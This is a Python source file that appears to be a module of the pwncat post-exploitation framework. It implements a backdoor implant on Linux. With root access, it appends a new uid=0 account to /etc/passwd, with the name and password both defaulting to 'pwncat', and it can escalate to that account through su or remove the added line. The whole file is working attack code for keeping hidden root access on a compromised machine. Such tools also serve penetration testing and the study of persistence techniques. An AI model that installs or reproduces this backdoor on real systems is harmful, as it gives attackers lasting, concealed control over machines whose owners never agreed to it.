#!/usr/bin/env python3
import crypt

import pwncat
from pwncat.facts import Implant, ImplantType
from pwncat.modules import Status, Argument, ModuleFailed
from pwncat.platform.linux import Linux
from pwncat.modules.implant import ImplantModule


class PasswdImplant(Implant):
    """Implant tracker for a user added directly to /etc/passwd"""

    def __init__(self, source, user, password, added_line):
        super().__init__(source=source, types=["implant.replace"], uid=0)

        self.user = user
        self.password = password
        self.added_line = added_line

    def escalate(self, session: "pwncat.manager.Session"):
        """Escalate privileges to the fake root account"""

        try:
            session.platform.su(self.user, password=self.password)
            return lambda session: session.platform.channel.send(b"exit\n")
        except PermissionError:
            raise ModuleFailed(f"authentication as {self.user} failed")

    def remove(self, session: "pwncat.manager.Session"):
        """Remove the added line"""

        if session.platform.getuid() != 0:
            raise ModuleFailed("removal requires root privileges")

        try:
            with session.platform.open("/etc/passwd", "r") as filp:
                passwd_contents = [line for line in filp if line != self.added_line]
        except (FileNotFoundError, PermissionError):
            raise ModuleFailed("failed to read /etc/passwd")

        try:
            with session.platform.open("/etc/passwd", "w") as filp:
                filp.writelines(passwd_contents)
        except (FileNotFoundError, PermissionError):
            raise ModuleFailed("failed to write /etc/passwd")

    def title(self, session: "pwncat.manager.Session"):
        return f"""[blue]{self.user}[/blue]:[red]{self.password}[/red] added to [cyan]/etc/passwd[/cyan] w/ uid=0"""


class Module(ImplantModule):
    """Add a user to /etc/passwd with a known password and UID/GID of 0."""

    TYPE = ImplantType.REPLACE
    PLATFORM = [Linux]
    ARGUMENTS = {
        **ImplantModule.ARGUMENTS,
        "backdoor_user": Argument(
            str, default="pwncat", help="name of new uid=0 user (default: pwncat)"
        ),
        "backdoor_pass": Argument(
            str, default="pwncat", help="password for new user (default: pwncat)"
        ),
        "shell": Argument(
            str, default="current", help="shell for new user (default: current)"
        ),
    }

    def install(
        self,
        session: "pwncat.manager.Session",
        backdoor_user,
        backdoor_pass,
        shell,
    ):
        """Add the new user"""

        if session.current_user().id != 0:
            raise ModuleFailed("installation required root privileges")

        if shell == "current":
            shell = session.platform.getenv("SHELL")
        if shell is None:
            shell = "/bin/sh"

        try:
            yield Status("reading passwd contents")
            with session.platform.open("/etc/passwd", "r") as filp:
                passwd_contents = list(filp)
        except (FileNotFoundError, PermissionError):
            raise ModuleFailed("faild to read /etc/passwd")

        # Hash the password
        yield Status("hashing password")
        backdoor_hash = crypt.crypt(backdoor_pass, crypt.METHOD_SHA512)

        # Store the new line we are adding
        new_line = f"""{backdoor_user}:{backdoor_hash}:0:0::/root:{shell}\n"""

        # Add the new line
        passwd_contents.append(new_line)

        try:
            # Write the new contents
            yield Status("patching /etc/passwd")
            with session.platform.open("/etc/passwd", "w") as filp:
                filp.writelines(passwd_contents)

            # Return an implant tracker
            return PasswdImplant(self.name, backdoor_user, backdoor_pass, new_line)
        except (FileNotFoundError, PermissionError):
            raise ModuleFailed("failed to write /etc/passwd")
